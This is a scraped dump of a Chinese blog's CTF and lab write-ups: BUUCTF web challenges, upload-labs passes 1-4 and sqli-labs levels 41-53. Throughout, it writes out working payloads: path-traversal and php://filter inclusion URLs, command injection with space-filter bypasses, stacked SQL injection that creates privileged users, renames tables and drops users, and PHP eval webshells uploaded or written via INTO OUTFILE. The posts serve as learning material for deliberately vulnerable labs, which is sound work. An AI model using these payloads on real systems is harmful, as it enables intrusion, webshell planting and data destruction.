empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 有个 hint.php 访问一下 知道 flag 在 ffffllllaaaagggg 文件里 分析一下代码 继续审计代码前先看几个函数： mb_substr () 函数返回字符串的一部分。substr () 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr ()。 注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。 mb_strpos (haystack ,needle) 查找字符串在另一个字符串中首次出现的位置 haystack：要被检查的字符串；needle：要搜索的字符串 mb_substr () 函数返回字符串的一部分 in_array () 函数搜索数组中是否存在指定的值。 注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。 urldecode ()：解码已编码的 URL 字符串 empty () 函数用于检查一个变量是否为空。 empty () 判断一个变量是否被认为是空的。当一个变量并不存在，或者它 的值等同于 FALSE，那么它会被认为不存在。如果变量不存在的话，empty () 并不会产生警告。 empty () 5.5 版本之后支持表达式了，而不仅仅是变量。 . 表示当前目录 . . 表示当前目录的上一级目录。 . ./ 表示当前目录下的某个文件或文件夹，视后面跟着的名字而定 ./ 表示当前目录上一级目录的文件或文件夹，视后面跟着的名字而定。 例如： 文件夹 a 下面有 文件夹 b c 和文件 d。 文件夹 b 下面有 e.php 和文件 f。 则 e 中的。表示 文件夹 b ./f 表示 b 下面的文件 f。 . . 表示 a 文件夹。 . ./d 表示 a 文件夹下的 d 文件。 学习链接： https://blog.csdn.net/m0_53314778/article/details/112629012 https://blog.csdn.net/qq_41523170/article/details/107590435 ok 开始代码审计 底部的 if 语句中有三个条件，一个判断文件不能为空，意思是是否传递了 file 参数，第二个传的参数是字符串，第三个是白名单检测，通过上方的 emmm 函数来检测 白名单为 source.php 和 hint.php，且函数里有 mb_strpos 和 mb_substr 截取内容，碰到？就截止了，所以我们在绕过白名单时多添加一个就可以绕过白名单 source.php?file=source.php? ，再用…/ 逐级跳转目录读取 flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; //白名单 if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; //判断参数$page为空或者不是字符串时输出you can&#x27;t see it if (in_array($page, $whitelist)) &#123; return true; &#125; //如果$page参数为白名单中的内容返回true $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) //查找?号出现的第一个位置 ); //如果$page的值有？则从?之前提取字符串 if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); //url对$page解码 $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); //第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串) if (in_array($_page, $whitelist)) &#123; return true; &#125; //第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真 echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; http://508337d2-4f77-4847-ba92-04461d8b0411.node4.buuoj.cn:81/source.php?file=source.php?../ffffllllaaaagggg 无 flag http://508337d2-4f77-4847-ba92-04461d8b0411.node4.buuoj.cn:81/source.php?file=source.php?../../ffffllllaaaagggg 再上一级还是无 flag 依次增加…/ http://508337d2-4f77-4847-ba92-04461d8b0411.node4.buuoj.cn:81/source.php?file=source.php?../../../../../ffffllllaaaagggg flag # [ACTF2020 新生赛] Include1 启动靶机 点击 tips，查看网页有什么变化 可发现是文件包含，已经明确给出，文件包含直接读取的是文件，而不是文件源码，所以要想办法读取源码方法。 那么就要涉及到 PHP 伪协议，这个是之前刚接触 ctf 学习时碰到的东西，记得还写了一个博客，重新学习一下 PHP 伪协议 后续重新写一个学习 php 伪协议的博客吧 了解了 PHP 伪协议后，那么此处应当使用 ：php://filter 读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了。 构造 payload： 1http://6e8cf394-7f9c-46d0-aaf6-1f2742baf857.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php # [ACTF2020 新生赛] Exec 1 输入 127.0.0.1;ls 试一试，ls 可以查看目录 可以看到这个目录下有一个 index.php 文件，并且能回显且；没有被过滤，给我的感觉就很想 sqli-lab 的堆叠注入 接着我们就遍历目录了，通过 cd …/ 达到访问上一个目录的目的，再通过 ls 达到查看该目录有哪些文件 当访问到…/…/…/ 时就可以看到有一个 flag 127.0.0.1;cd …/…/…/;ls 我起初还以为时一个文件夹，就访问一下，结果访问结果让我有点懵 难道这个不是一个文件夹，导致我访问不了吗，我有输入了一个不存在上一个目录的名字 回显结果一致，我猜测应该是不存在这个 flag 文件夹导致无法查看 所以 flag 就在这个目录下不用，直接读取 flag 这个文件 这里要用到 cat 这个指令 cat 主要有三大功能： 1. 显示整个文件:cat filename 2. 创建一个文件:cat &gt; filename 只能创建新文件，不能编辑已有文件. 3. 合并文件:cat file1 file2 &gt; file 构建 payload 1127.0.0.1;cd ../../../;cat flag 得到 flag flag # [强网杯 2019] 随便注 1 # 解题 打开题目可以看出是一道 sql 注入题 1’报错回显，闭合单引号 order by 查字段，只显示两列，order by 3 时如图 查表 1’;show tables;# 可以看到有两个表，分别是 1919810931114514 和 words 依次查两个表的字段 这里在查这个全数字的表时遇到问题了，这个数值我直接 from 1919810931114514 无法查询，form '1919810931114514’也不能查询，通过一个博客的记录学到了 关于在这里使用 ` 而不是 ’ 的一些解释： 两者在 linux 下和 windows 下不同，linux 下不区分，windows 下区分。 单引号 ’ 或双引号主要用于 字符串的引用符号 反勾号 ` 数据库、表、索引、列和别名用的是引用符是反勾号 (注：Esc 下面的键) 有 MYSQL 保留字作为字段的，必须加上反引号来区分！！！ 如果是数值，请不要使用引号。 原文链接：https://blog.csdn.net/m0_62879498/article/details/123292860 words 表直接 from words 就可以查询了或者反勾号，单引号是不行的 表 1919810931114514 表 words 显而易见 flag 在 1919810931114514 中 爆出来了 flag 字段 通过爆出的这两个表的内容可以看到 words 表有 id 和 data 两个属性 我们查询框中输入 1 查询出来的内容也具有两个属性 而 1919810931114514 这个表中只有一个属性 flag 这时候我们可以把 1919810931114514 表命名为 words，把原来的 words 命名为其他名字比如说 word1 改完名字后新的 words 把 flag 改名为 id 然后直接查询就好了 payload： 1http://86dfb45e-acb1-49e0-aa36-be2cd7e0896b.node4.buuoj.cn:81/?inject=1&#x27;;rename table `words` to word1;rename table `1919810931114514` to `words`;alter table words change flag id varchar(100);# 更改成功后我们也可以通过 show tables，show columns from words 等来查询是否更改成功，我就不一一列出了 我直接查询 1’ or 1=1# 得到 flag # 知识点归纳 # show 在过滤了 select 和 where 的情况下，还可以使用 show 来爆出数据库名，表名，和列名。 show datebases; //数据库。 show tables; //表名。 show columns from table; //字段。xxxxxxxxxx show columns from table; //字段。1 # alter 作用：修改已知表的列。（ 添加：add | 修改：alter，change | 撤销：drop ） 用法： 添加一个列 alter table &quot; table_name&quot; add &quot; column_name&quot; type; 删除一个列 alter table &quot; table_name&quot; drop &quot; column_name&quot; type; 改变列的数据类型 alter table &quot; table_name&quot; alter column &quot; column_name&quot; type; 改列名 alter table &quot; table_name&quot; change &quot; column1&quot; &quot; column2&quot; type; alter table “table_name” rename “column1” to “column2”; 学习链接：https://blog.csdn.net/qq_44657899/article/details/103239145 # [SUCTF 2019]EasySQL 1 输入 1 1’ or ‘1’='1 1’ order by 1# 也都无效反回 Nonono 基于时间的盲注和报错注入都需要嵌套联合查询语句来实现，因此可以跳过，直接试试布尔型盲注 1’ and length(database())&gt;=1 还是 Nonono 尝试堆叠注入 1;show databases; 1;show tables; 接下来是网上的两种解法 第一种 是猜出了源码 select $_POST [‘query’] || flag from Flag sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于 CONCAT () 函数 当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于 OR 函数 第一种就按默认没有配置来进行，此时 || 就是逻辑或 || 在命令执行中见过， 回顾: command1;command2 顺序执行 command1 || command2 如果 command1 执行失败，则执行 command2 command1 &amp;&amp; command2 如果 command1 执行成功，则执行 command2 因此只需要将 **$_POST [‘query’]** 提交的数据换成 *,1 (如果直接写 * 的话会被报错，且 * 写在后面会失效) 代入猜出的源码中（拼接语句）: sql=select.post[‘query’].&quot;||flag from Flag&quot;; 如果 $post [‘query’] 的数据为 *,1 sql 语句就变成了 select *,1||flag from Flag 就是 select *,1 from Flag，这样就直接查询出了 Flag 表中的所有内容。 此处的 1 是临时增加一列，列名为 1 且这一列的所有值都为 1 得到 flag 第二种 第二种是将 || 作为字符串连接符，因此需要在语句中更改其配置 sql_mode=PIPES_AS_CONCAT 时即可 Payload:1;set sql_mode=PIPES_AS_CONCAT;select 1 拼接完之后：select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag 相当于是 select 1 from Flag 和 select flag from Flag # [GXYCTF2019]Ping Ping Ping 1 从页面可以看到本题要我们构造 ip 用 127.0.0.1 加上管道符和 linux 常用命令 ls 试试 构造？ip=127.0.0.1;ls 直接可以看到 flag.php cat 连接它试试 清楚的看到空格被过滤了 这里就要提到绕过空格的方法了 ${IFS} 替换 $IFS$1 替换 ${IFS 替换 %20 替换 &lt;和 &lt;&gt; 重定向符替换 %09 替换 一个个尝试可知 $IFS$1 是可行的 所以构造？ip=127.0.0.1;cat$IFS$1flag.php flag 也被过滤 试试 index ?ip=127.0.0.1;cat$IFS$1index.php 大部分符号都被过滤了 从大佬学习到了构造这个 payload ?ip=127.0.0.1;a=g;cat$IFS1fla1fla1flaa.php 我对这个代码的理解就是先构造一个参数 a（名字都是可以的，我尝试把 a 换成 b 也是能获得 flag 的），让参数 a=g，然后 get 到 ip 之后执行语句，把 flaa.php里的参数a.php里的参数a.php里的参数 a 替换成 g 构造除 flag 这个单词做到绕过 flag 的过滤 拿下 flag # [极客大挑战 2019] Secret File 1 进入页面 F12 看到这个 Archive_room.php 这个文件访问 ​ 点击按钮 没有获得有用的信息 用 bp 抓包一下 有一个被注释的 php 文件 访问 审计代码利用 php 伪协议 filter 获取 base64 加密的 flag.php 文件的内容后解码 得到 flag ?file=php://filter/read=convert.base64-encode/resource=flag.php 解码得到 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;FLAG&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt; &lt;?php echo &quot;我就在这里&quot;; $flag = &#x27;flag&#123;c036159a-0f38-4284-a194-7c6b38b1d453&#125;&#x27;; $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27; ?&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 拿下 flag","categories":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/categories/buuctf/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/tags/buuctf/"}]},{"title":"upload-labs","slug":"upload-labs","date":"2023-04-05T09:41:11.000Z","updated":"2024-11-08T10:10:58.768Z","comments":true,"path":"2023/04/05/upload-labs/","link":"","permalink":"https://dr4x3zz.github.io/2023/04/05/upload-labs/","excerpt":"upload-labs 是一个使用 php 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场。","text":"upload-labs 是一个使用 php 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场。 # 文件上传漏洞原理 # 成因 1、服务器配置不当会导致任意文件上传 2、web 应用开放了文件上传的功能，并对上传的文件没有进行足够的限制和过滤 3、web 应用开放了文件上传功能，虽然在开发时加入了一定的过滤功能，但并不严格，可以被绕过 4、上传文件时如果服务端代码未对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp 等格式的文件）。 (1 条消息) php、jsp、asp 和 aspx 的区别_谢公子的博客 - CSDN 博客 链接中对四个后缀名不同的文件有详细介绍 # 漏洞产生条件 1、web 服务器要开启文件上传功能，并且上传 API（接口）对外开放，即 web 用户可以访问； 2、web 用户对目标目录具有可写权限，甚至具有执行权限，一般情况下，web 目录都具有执行权限； 3、我们上传的文件在服务器的系统环境里能够正常运行，即 web 容器能够解析我们上传的脚本，不论脚本以什么样的形式存在。 # 危害 恶意的脚本文件，又被称为 webshell，webshell 脚本称为一种网页后门，webshell 脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件、执行系统命令等 学习来源学长的博客：upload-labs1 - Tlife (hwwg.github.io) # Pass-01 从代码就可以看出上传文件的类型被限制了，如果我们上传了一个除.jpg|.png|.gif 这三个后缀名的文件会被提示 # 方法一 我们先新建一个 txt 文件，输入 php 一句话木马 1&lt;?php @eval($_POST[&#x27;uploadlabs&#x27;]); ?&gt; 我们链接这个一句话木马的密码就是 uploadlabs 把这个 txt 后缀改为允许上传的三个文件后缀名 这里我把它改为.jpg 这时候上传再用 burp 抓包，将其后缀名改为 php 把 jpg 改为 php 再放包 右击图片在新标签页打开 测试是否上传成功 这里可以看到一句话木马上传的路径，让密码等于 phpinfo () 然后使用蚁剑连接一句话木马 测试链接，成功后添加，就可以对目标进行操作了 # 方法二 查看网页源代码，可以发现是 javascript 前端验证，直接把 javascript 禁用就可以上传，尝试一下 F12-&gt; 调试器 -&gt; 设置 -&gt; 禁用 javascript 直接上传一个 php 后缀的一句话木马文件 剩余的步骤和方法一一致不再复述一遍了 # Pass-02 进入页面发现还是需要上传一个文件，我们先上传看看回显情况。上传了一个文件名后缀为.php 的文件后提示类型错误，错误回显的方式不是弹窗，是页面直接提示，所以不是前端验证。 本关提示为：本 pass 在服务端对数据包的 MIME 进行检查！ # MIME MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。 MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。 浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理 URL，因此 Web 服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。 文件扩展名 Mime-Type .js application/x-javascript .html text/html .jpg image/jpeg .pdf application/pdf .png image/png # Content-Type Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，这就是经常看到一些 PHP 网页点击的结果却是下载一个文件或一张图片的原因。 Content-Type 标头告诉客户端实际返回的内容的内容类型。 常见的媒体格式类型如下： text/html ： HTML 格式 text/plain ：纯文本格式 text/xml ： XML 格式 image/gif ：gif 图片格式 image/jpeg ：jpg 图片格式 image/png：png 图片格式 以 application 开头的媒体格式类型： application/xhtml+xml ：XHTML 格式 application/xml： XML 数据格式 application/atom+xml ：Atom XML 聚合格式 application/json： JSON 数据格式 application/pdf：pdf 格式 application/msword ： Word 文档格式 application/octet-stream ： 二进制流数据（如常见的文件下载） application/x-www-form-urlencoded ： 中默认的 encType，form 表单数据被编码为 key/value 格式发送到服务器（表单默认的提交数据的格式） 另外一种常见的媒体格式是上传文件之时使用的： multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式 # 方法 # 方法一 和 pass-01 一样先上传一个有一句话木马的 txt 将后缀修改为 jpg 这时候可以看到 content-type 已经为 image/jpeg 避开过滤了 把后缀改为 php 右击图片打开，验证是否上传成功 url?uploadlabs=phpinfo () 蚁剑连接 # 方法二 直接上传一个一句话木马的 php 后缀名文件，抓包 将 Content-Type 改为 image/jpeg 就可以成功上传了 # 源码函数学习 # file_exists() file_exists — 检查文件或目录是否存在 1file_exists(string $filename): bool # move_uploaded_file() move_uploaded_file () 函数将上传的文件移动到新位置。 若成功，则返回 true，否则返回 false。 参数 描述 file 必需。规定要移动的文件。 newloc 必需。规定文件的新位置。 1move_uploaded_file(file,newloc) 本函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。 如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file () 将返回 false。 如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file () 将返回 false，此外还会发出一条警告。 # Pass-03 查看源代码 12345678910111213141516171819202122232425262728$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 从源码中我们可以看出设定了黑名单，’.asp’,’.aspx’,’.php’,’.jsp’后缀的文件都不允许上传，并且会检查大小写、删除点和空格。 想要绕过黑名单可以使用脚本的其他拓展名。 这里我想要上传一个’.php’后缀的文件，所以列举一些 php 文件的其他拓展名。 1.php .phtml .phps .php3 .php4 .php5 .pht 直接把带有一句话木马的 php 文件改为 php5 文件上传 连接蚁剑 在使用小皮面板的时候一直不可以解析 php5，搞了我一个多小时不行… 我直接换成 phpstudy2018，教程如下 (1 条消息) 31. phpstudy 无法解析 php2、php3、phtml 等文件_phpstudy 不解析 php___Qian 的博客 - CSDN 博客 # Pass-04 本关把 php、jsp 等等所有后缀名全过滤了，这个时候我们需要引进一个.htaccess 文件 htaccess 文件是 Apache 服务器中的一个配置文件，他负责相关目录下的网页配置。通过 htaccess 文件，可以帮助我们实现：网页 301 重定向，自定义 404 错误页面，改变文件扩展名，允许或组织特定的用户或者，目录的访问，禁止目录列表，配置默认文档等功能。 其中.htaccess 文件内容:SetHandler application/x-httpd-php 设置当前目录所有文件都使用 PHP 解析，无论上传任何文件，只要符合 php 语言代码规范，就会被当做 php 文件执行。 新建一个文本，输入内容 123&lt;FilesMatch &quot;uploadlabs04.png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 代码中 uploadlabs04.png 会被解析为 php 文件 重命名为.htaccess **PS：** 这里需要将上传的文件不用前缀 即.htaccess 先上传.htaccess 然后上传一句话木马图片，接着蚁剑连接就 ok 了 # Pass-05 # Pass-06 # Pass-07 # Pass-08 # Pass-09 # Pass-10 # Pass-11 # Pass-12 # Pass-13 # Pass-14 # Pass-15 # Pass-16 # Pass-17 # Pass-18 # Pass-19 # pass-20 # pass-21","categories":[{"name":"upload-labs","slug":"upload-labs","permalink":"https://dr4x3zz.github.io/categories/upload-labs/"}],"tags":[{"name":"upload-labs","slug":"upload-labs","permalink":"https://dr4x3zz.github.io/tags/upload-labs/"}]},{"title":"sqli-labs-46-53","slug":"sqli-labs-46-53","date":"2023-03-31T13:01:07.000Z","updated":"2024-11-08T10:10:50.677Z","comments":true,"path":"2023/03/31/sqli-labs-46-53/","link":"","permalink":"https://dr4x3zz.github.io/2023/03/31/sqli-labs-46-53/","excerpt":"# sqli-labs-46-53","text":"# sqli-labs-46-53 # sqli-labs-46 Please input parameter as SORT with numeric value 请输入参数作为带有数值的排序 试用 sort 分别取 1，2，3 1url?sort=1 1url?sort=2 1url?sort=3 显而易见，出现的表格是根据 sort 后面的值表示的列来排序的 添加单引号 1url?sort=3&#x27; 页面报错 本关无闭合 1url?sort=3 and sleep(5) 使用之间注入验证一下 有明显的延迟 确实无闭合 直接使用报错注入 获取用户 user 1url?sort=3 and updatexml(1,concat(0x7e,user(),0x7e),3) 爆库 1url?sort=3 and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),3) 因为限制以此类推，直至获取所有数据库名称 之后获取表名啊字段名啊什么的就不一一列举了 这里尝试写入 webshell 并链接蚁剑 先用字符串转 16 进制 讲一句话木马转换成 16 进制数 1&lt;?php @eval($_POST[&#x27;46&#x27;]);?&gt; 0x3c3f70687020406576616c28245f504f53545b273436275d293b3f3e 1url?sort=3 into outfile &#x27;D:/phpstudy/www/46.php&#x27; lines terminated by 0x3c3f70687020406576616c28245f504f53545b273436275d293b3f3e 使用蚁剑连接一句话木马 连接成功，可以直接访问了 # sqli-labs-47 本关和上关大致相同 1url?sort=1&#x27; 闭合单引号就可以了 1url?sort=1&#x27; --+ payload 就不一一列出了 # sqli-labs-48 12url?sort=1&#x27;url?sort=1&quot; 发现本关不报错，且没有查询结果，说明本关是数字型，无闭合 使用布尔注入或者其他盲注手段 # sqli-labs-49 12url?sort=1&#x27; //有查询结果url?sort=1&quot; //无查询结果 说明本关闭合包含单引号 1url?sort=1&#x27; --+ 验证是否闭合为单引号 闭合为单引号 获取当前数据库 1url?sort=1&#x27; and substr((select database()),1,8)=&#x27;security&#x27; --+ # sqli-labs-50 本关题目说是堆叠注入 1url?sort=1&#x27; 无闭合 堆叠注入写 webshell 1url?sort=1;select &#x27;&lt;?php @eval($_POST[&#x27;less50&#x27;]);?&gt;&#x27; into outfile &#x27;D:/phpstudy/www/less50.php&#x27; 配合蚁剑 # sqli-labs-51 1url?sort=1&#x27; 单引号闭合 堆叠注入 尝试新建一个用户 这里学习一些相关知识 这样就比能理解这个语句的意思了 学习链接：https://blog.csdn.net/paullinjie/article/details/80340145 1url?sort=1&#x27;;CREATE USER &#x27;tongzheng&#x27;@&#x27;localhost&#x27;;GRANT ALL PRIVILEGES ON *.* TO &#x27;tongzheng&#x27;@&#x27;localhost&#x27;;--+ 这样就新建成功了 tongzheng 用户，且拥有除 Grant Option 之外的所有权限 GRANT OPTION，用户被授予了某个权限，那么默认情况下，该用户是不能把这个权限授予给其他人的。 # sqli-labs-52 12url?sort=1&#x27; //无查询结果url?sort=1&quot; //无查询结果 可知本关无闭合，数字型 上一关创建了用户 tongzheng 但是没有 grant option 权限，这关尝试堆叠注入授权 1url?sort=1;GRANT grant option ON *.* TO &#x27;tongzheng&#x27;@&#x27;localhost&#x27; 可以看到用户 tongzheng 已经拥有 grant option 权限 # sqli-labs-53 本关 sort=1 和 sort=1&quot; 都有查询结果，sort=1’没有查询结果，可以判断单引号闭合，其余的就和前面一样了，删除数据库用户指令可以参考这个 payload 1http://192.168.101.16/sqli-labs-master/Less-53/?sort=1&#x27;;DROP USER &#x27;xiannv&#x27;@&#x27;localhost&#x27;;-- s 来源：https://blog.csdn.net/elephantxiang/article/details/120337529","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-41-45","slug":"sqli-labs-41-45","date":"2023-03-29T08:15:31.000Z","updated":"2024-11-08T10:10:42.440Z","comments":true,"path":"2023/03/29/sqli-labs-41-45/","link":"","permalink":"https://dr4x3zz.github.io/2023/03/29/sqli-labs-41-45/","excerpt":"# sqli-labs-41-45","text":"# sqli-labs-41-45 # sqli-labs-41 id=1 有查询结果 id=1’ 无查询结果 id=1&quot; 无查询结果 id=1 --+ 有查询结果 本关无闭合 查看源代码确实无闭合 直接进行堆叠注入 在 oblivion10 数据库下新建一个 test 表然后再删除 1url?id=1;use oblivion10;create table test(id int,user varchar(10)); --+ 成功创建 尝试删除 1url?id=1;drop table oblivion10.test; --+ 成功删除表 test # sqli-labs-42 本关为 post 型 我们登录并且使用 bp 抓包 那我们可以通过这个来更改 user admin 的密码，不过登录成功后也可以直接更改我觉得没什么必要更改这个用户的密码了 所以尝试更改 security 中其他用户的密码 尝试更改 user stupid 的密码 bp 抓包，尝试闭合，发现本关是单引号闭合 更改密码 成功 # sqli-labs-43 PHP mysqli_real_escape_string () 函数 转义字符串中的特殊字符 通过代码知道本关 password 是一个很明显的注入点 直接用 hackbar 来做这一道题，不过不能直接 load url，要直接提交至目标表单，再 load url 后面添加 login.php 1url/login.php 由于我没有重置数据库，我的 admin 用户的 password 为 qwe 添加单引号尝试闭合 在 post data 输入 1login_user=admin&amp;login_password=qwe&#x27;&amp;mysubmit=Login 显而易见闭合为’) 之后对数据库的各种操作就不说了 # sqli-labs-44 post data login_user=admin’&amp;login_password=qwe&amp;mysubmit=Login login_user=admin&quot;&amp;login_password=qwe&amp;mysubmit=Login login_user=admin&amp;login_password=qwe’&amp;mysubmit=Login login_user=admin&amp;login_password=qwe&quot;&amp;mysubmit=Login 说明本关不报错 盲注找闭合的方法其实也很简单，像本关这样两个输入框的正确值都不知道的情况下，在普通找闭合的 payload 中闭合符号之后增加 **or 1=1#** 就行，如果返回的页面显示登录成功，说明闭合成功。 用 hackbar 向 1url/login.php 发送如下 payload 检查 username 输入框是否有注入点 login_user=admin’ or 1=1#&amp;login_password=qwe&amp;mysubmit=Login login_user=admin&quot; or 1=1#&amp;login_password=qwe&amp;mysubmit=Login 页面回显都是下图这样登录失败的页面，username 输入框没找到注入点 送如下 payload 检查 password 输入框是否有注入点 login_user=admin&amp;login_password=pass’ or 1=1#&amp;mysubmit=Login 成功 剩下的就是堆叠注入了 这里来使用试下清空表中所有数据的 sql 语句 先在 oblivion10 数据库中新建几个数据 123456789login_user=admin&amp;login_password=qwe&#x27;;insert into oblivion10.test66 values(1,&#x27;tset2&#x27;)#&amp;mysubmit=Loginlogin_user=admin&amp;login_password=qwe&#x27;;insert into oblivion10.test66 values(2,&#x27;tset2&#x27;)#&amp;mysubmit=Loginlogin_user=admin&amp;login_password=qwe&#x27;;insert into oblivion10.test66 values(3,&#x27;tset3&#x27;)#&amp;mysubmit=Login 尝试删除 1login_user=admin&amp;login_password=qwe&#x27;;truncate table oblivion10.test66#&amp;mysubmit=Login 成功删除 # sqli-labs-45 用 44 关写到的方法 post data 输入 1login_user=admin&amp;login_password=qwe&#x27;) or 1=1#&amp;mysubmit=Login 本关尝试给 oblivion10 数据库中 test66 表新增一列 1login_user=admin&amp;login_password=qwe&#x27;);alter table oblivion10.test66 add column num int(10)#&amp;mysubmit=Login 新增成功","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"buuctf[极客大挑战2019]Havefun","slug":"buuctf-极客大挑战2019-Havefun","date":"2023-03-28T13:16:28.000Z","updated":"2024-11-08T10:01:19.543Z","comments":true,"path":"2023/03/28/buuctf-极客大挑战2019-Havefun/","link":"","permalink":"https://dr4x3zz.github.io/2023/03/28/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/","excerpt":"# buuctf [极客大挑战 2019] Havefun","text":"# buuctf [极客大挑战 2019] Havefun 进入页面 无可用信息，查看源代码 在下方被注释掉的一行中 第 409 行说明这里使用 cat 变量接受参数 if 语句中将 cat 变量中的参数和’dog‘进行比较，如果相等会出现什么呢尝试一下 成功得到 flag","categories":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/categories/buuctf/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/tags/buuctf/"}]},{"title":"buuctf[极客大挑战2019]EasySQL","slug":"buuctf-极客大挑战2019-EasySQL","date":"2023-03-28T13:16:11.000Z","updated":"2024-11-08T10:01:09.249Z","comments":true,"path":"2023/03/28/buuctf-极客大挑战2019-EasySQL/","link":"","permalink":"https://dr4x3zz.github.io/2023/03/28/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/","excerpt":"# buuctf [极客大挑战 2019] EasySQL","text":"# buuctf [极客大挑战 2019] EasySQL 启动靶机 post 注入 可以看到是 php 写的 